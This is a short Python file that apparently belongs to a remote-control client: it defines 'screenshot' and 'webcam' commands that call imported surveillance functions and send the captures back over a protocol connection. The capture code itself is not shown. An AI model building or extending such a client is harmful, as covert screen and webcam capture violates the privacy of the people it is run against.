from client.commands.base import Command
from client.modules.surveillance.screenshot import screenshot
from client.modules.surveillance.webcam import webcam_capture


class ScreenshotCommand(Command):
    name = 'screenshot'

    def execute(self, ctx, raw: str):
        screenshot(ctx.protocol)
        return True


class WebcamCommand(Command):
    name = 'webcam'

    def execute(self, ctx, raw: str):
        webcam_capture(ctx.protocol)
        return True
